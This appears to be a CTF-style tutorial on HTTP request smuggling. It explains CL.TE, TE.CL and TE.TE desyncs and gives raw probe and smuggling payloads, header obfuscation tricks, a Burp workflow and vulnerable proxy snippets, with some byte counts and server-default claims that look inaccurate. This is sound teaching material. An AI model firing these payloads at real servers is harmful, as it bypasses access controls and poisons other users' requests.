# HTTP Request Smuggling — Basics

---

## Quick Reference

| Type | Front-End reads | Back-End reads | Ambiguity |
|------|----------------|----------------|-----------|
| CL.TE | `Content-Length` | `Transfer-Encoding` | Front-end cuts by length, back-end waits for chunk terminator |
| TE.CL | `Transfer-Encoding` | `Content-Length` | Front-end reads chunks, back-end cuts by length |
| TE.TE | `Transfer-Encoding` | `Transfer-Encoding` | Both read TE but one can be tricked to ignore it |

```http
-- CL.TE smuggle prefix (poisons next request with "GPOST")
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST
```

```http
-- TE.CL smuggle prefix (poisons next request)
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

---

## What is HTTP Request Smuggling? 🔓

Modern web apps sit behind a **chain of servers** — a load balancer or reverse proxy (front-end) forwards requests to an origin server (back-end). HTTP Request Smuggling exploits a disagreement between these two servers about **where one HTTP request ends and the next begins**.

**Impact:**
- 🔴 Bypass front-end security controls (auth, WAF, IP allowlists)
- 🔴 Poison the request queue — your smuggled prefix prepends to another user's request
- 🔴 Capture other users' credentials and session tokens
- 🔴 Perform cache poisoning, SSRF, and reflected XSS via other users' browsers
- ⚠️ Requires HTTP/1.1 keep-alive connections — the front-end must reuse the TCP connection to the back-end

**The core idea:**

```
Normal flow:
[Request A] → Front-end → Back-end → [Response A]
[Request B] → Front-end → Back-end → [Response B]

Smuggled flow:
[Request A + smuggled prefix] → Front-end → Back-end → [Response A]
                                                  ↓
                              [smuggled prefix + Request B] → Back-end processes poisoned request
```

**Why it works — HTTP/1.1 has two body-length headers:**

```http
Content-Length: 10          ← body is exactly 10 bytes
Transfer-Encoding: chunked  ← body ends at chunk terminator "0\r\n\r\n"
```

When both headers appear in one request, the RFC says to ignore `Content-Length`. But not every server follows this — the disagreement is the vulnerability.

---

## Detecting HTTP Request Smuggling

Detection requires sending carefully timed requests and observing whether a smuggled prefix "sticks" and affects subsequent requests.

**Step 1 — Confirm keep-alive connection reuse:**
The front-end must forward multiple requests over the same TCP connection to the back-end. Most modern infrastructure does this by default for performance.

**Step 2 — Send a timing-based probe:**

For **CL.TE** — send a request where CL says the body is complete but TE is waiting for a chunk terminator:

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If the back-end reads `Transfer-Encoding`, it waits for the `0\r\n\r\n` terminator that never comes → **response hangs** = CL.TE confirmed ✅

For **TE.CL** — send a request where TE terminates early but CL says more bytes are coming:

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

If the back-end reads `Content-Length`, it waits for the remaining byte after `0\r\n\r\n` → **response hangs** = TE.CL confirmed ✅

**Step 3 — Confirm with a differential response:**

Send the smuggle payload, then immediately send a normal request. If the normal request gets a weird or unexpected response (wrong status, garbled content) — a prefix was prepended to it by the back-end. 🔓

⚠️ **Always use Burp Suite** with "Update Content-Length" **disabled** and HTTP/1 forced. Burp Repeater → uncheck "Update Content-Length" → right-click → "Send request in HTTP/1".

---

## CL.TE — Content-Length Front-End, Transfer-Encoding Back-End

The front-end trusts `Content-Length` and forwards a fixed number of bytes. The back-end trusts `Transfer-Encoding` and reads chunks — so leftover bytes from the front-end's cut become the start of the back-end's next request.

**How the ambiguity works:**

```
Front-end sees Content-Length: 13 → forwards exactly 13 bytes → done
Back-end sees Transfer-Encoding: chunked → reads "0\r\n\r\n" → done
                                         → 8 leftover bytes ("SMUGGLED") remain in buffer
                                         → next incoming request gets "SMUGGLED" prepended
```

**Basic CL.TE payload:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**CL.TE confirmation probe — expect timeout on second request:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

Back-end reads chunk `Z` (1 byte), then waits for more chunks. `Q` is not a valid chunk size → hangs.

**CL.TE — smuggle a GPOST prefix to poison the next request:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
```

Next legitimate user request arrives → back-end sees `GPOST / HTTP/1.1<their request>` → returns `Unrecognized method GPOST` to the victim.

---

## TE.CL — Transfer-Encoding Front-End, Content-Length Back-End

The front-end reads chunks and forwards them as a complete body. The back-end reads `Content-Length` — which is smaller than the actual forwarded data — so excess bytes remain in the buffer for the next request.

**How the ambiguity works:**

```
Front-end reads Transfer-Encoding: chunked
  → reads chunk "8\r\nSMUGGLED\r\n0\r\n\r\n" → full body → forwards all bytes
Back-end reads Content-Length: 3
  → reads only "8\r\n" (3 bytes) → done
  → "SMUGGLED\r\n0\r\n\r\n" stays in buffer → prepended to next request
```

**Basic TE.CL payload:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

⚠️ The trailing `\r\n` after `0` is required. In Burp, add two blank lines after the final `0`.

**TE.CL — smuggle a prefix to a restricted endpoint:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

36
GET /admin HTTP/1.1
Host: vulnerable.com

0


```

Next user's request gets `GET /admin HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n` prepended → back-end processes an admin request on their behalf.

---

## TE.TE — Both Servers Read Transfer-Encoding

Both servers support `Transfer-Encoding: chunked` — but one can be tricked into **ignoring** it through obfuscation. Once one server ignores TE and falls back to CL, the vulnerability becomes CL.TE or TE.CL.

**Obfuscation techniques to make one server ignore TE:**

```http
-- Capitalization variation
Transfer-Encoding: Chunked
Transfer-Encoding: CHUNKED

-- Whitespace tricks
Transfer-Encoding : chunked
Transfer-Encoding:  chunked
Transfer-Encoding	:chunked      ← tab before colon

-- Invalid value that some parsers skip
Transfer-Encoding: xchunked
Transfer-Encoding: x-custom, chunked

-- Duplicate header
Transfer-Encoding: chunked
Transfer-Encoding: identity

-- Wrapped / nested
X-Transfer-Encoding: chunked
Transfer-Encoding
  : chunked                       ← line folding (RFC obsolete but some parsers accept)
```

**TE.TE exploit flow:**

1. Send both `Transfer-Encoding: chunked` and an obfuscated second `Transfer-Encoding` header
2. One server processes the valid TE header (reads chunks)
3. The other server is confused by the obfuscated value and ignores TE → falls back to CL
4. Now you have a CL.TE or TE.CL scenario — exploit accordingly

**TE.TE payload example (front-end ignores obfuscated TE, back-end reads it):**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked
Transfer-Encoding: x-ignored

0

SMUGGLED
```

---

## Exploitation Workflow

1. **Confirm the architecture** — is there a front-end proxy? Check response headers for `Via`, `X-Forwarded-For`, `X-Cache`, `Server` (nginx in front, Apache behind = common setup)
2. **Force HTTP/1.1** — disable HTTP/2 in Burp (Project options → HTTP/2 → disable)
3. **Disable auto Content-Length** — uncheck "Update Content-Length" in Burp Repeater
4. **Send timing probe for CL.TE** — hang test with mismatched CL/TE
5. **Send timing probe for TE.CL** — hang test with early chunk terminator
6. **Confirm with differential response** — send smuggle + normal request back-to-back, observe if normal request is poisoned
7. **Identify your smuggled prefix goal** — bypass auth? access `/admin`? capture requests?
8. **Craft the smuggle payload** — put your prefix after the chunk terminator (CL.TE) or inside the chunk body (TE.CL)
9. **Deliver and verify** — send payload, then immediately send a benign request to observe the effect on the victim slot

---

## Common Vulnerable Patterns

**Nginx front-end + Apache back-end (classic CL.TE setup):**

```
# Nginx (front-end) — trusts Content-Length by default
# Apache (back-end) — prefers Transfer-Encoding
# Combined: CL.TE vulnerable when both headers present
```

**HAProxy + Gunicorn (TE.CL setup):**

```
# HAProxy (front-end) — reads Transfer-Encoding chunked
# Gunicorn (back-end) — reads Content-Length
# Combined: TE.CL vulnerable
```

**Misconfigured Content-Length passthrough:**

```python
# ❌ Vulnerable proxy — forwards Content-Length as-is without revalidating
def forward(request):
    headers = request.headers          # includes both CL and TE as sent
    body = request.body[:int(request.headers['Content-Length'])]
    return backend.send(headers, body) # back-end may disagree on body boundary
```

**Missing TE header normalization:**

```nginx
# ❌ Vulnerable nginx config — does not strip Transfer-Encoding before forwarding
location / {
    proxy_pass http://backend;
    # Missing: proxy_set_header Transfer-Encoding "";
}
```

---

## CTF & Practical Tips

**Fastest initial checks:**

```http
-- Add both headers and observe:
Content-Length: 6
Transfer-Encoding: chunked

-- If back-end response is delayed on a mismatched request → smuggling exists
```

**Setup tips:**
- ✅ Use **Burp Suite** — it's the standard tool; Repeater handles raw HTTP/1.1 well
- ✅ Install the **HTTP Request Smuggler** Burp extension — automates detection across all 3 types
- ✅ Always send probes with `Connection: keep-alive` to ensure connection reuse
- ✅ Repeat confirmation probes 2–3 times — timing issues can cause false negatives
- ⚠️ Never test on production — smuggling poisons the connection for real users
- ⚠️ Some CDNs (Cloudflare, Akamai) normalize headers — smuggling may not reach the origin

**Common CTF scenarios:**
- **"Access /admin but it's restricted to 127.0.0.1"** → CL.TE smuggle `GET /admin HTTP/1.1\r\nHost: localhost`
- **"Bypass front-end auth header check"** → smuggle a request without the required header
- **"The challenge says keep-alive is enabled"** → that's a hint — look for CL/TE discrepancy
- **Response says "Unrecognized method XPOST"** → your smuggled prefix hit the next request ✅

---

## Key Takeaways

- ✅ Smuggling exploits disagreement between front-end and back-end on where a request body ends
- ✅ CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding — leftover bytes poison next request
- ✅ TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length — excess chunk data poisons next request
- ✅ TE.TE: both read Transfer-Encoding, but obfuscate one header to make one server ignore it — then exploit as CL.TE or TE.CL
- ✅ Detection is timing-based — a hanging response confirms the back-end is waiting for bytes that the front-end already consumed
- ✅ Always disable auto Content-Length updates in Burp and force HTTP/1.1 before testing